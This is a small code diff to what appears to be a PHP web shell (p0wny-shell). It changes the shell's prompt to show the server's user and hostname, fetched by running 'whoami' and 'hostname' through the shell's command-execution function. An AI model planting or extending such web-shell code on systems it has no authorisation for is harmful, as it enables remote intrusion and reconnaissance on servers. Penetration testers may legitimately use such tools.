@@ -424,7 +424,11 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                let info = "<?php echo htmlentities(executeCommand('echo `whoami`@`hostname`')); ?>";
+                if (info === "") {
+                    info = "p0wny@shell";
+                }
+                return info + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
